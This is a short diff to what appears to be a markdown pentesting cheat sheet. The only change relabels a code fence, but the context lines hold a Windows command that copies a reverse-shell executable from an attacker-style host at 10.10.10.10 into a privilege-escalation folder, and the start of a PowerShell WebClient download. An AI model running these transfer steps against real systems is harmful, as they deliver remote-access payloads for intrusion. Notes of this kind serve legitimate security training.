@@ -19,7 +19,7 @@ hello world
 
 
 ####  wget alternative in windows
-```ps1
+```powershell
 	copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 	$client = new-object System.Net.WebClient
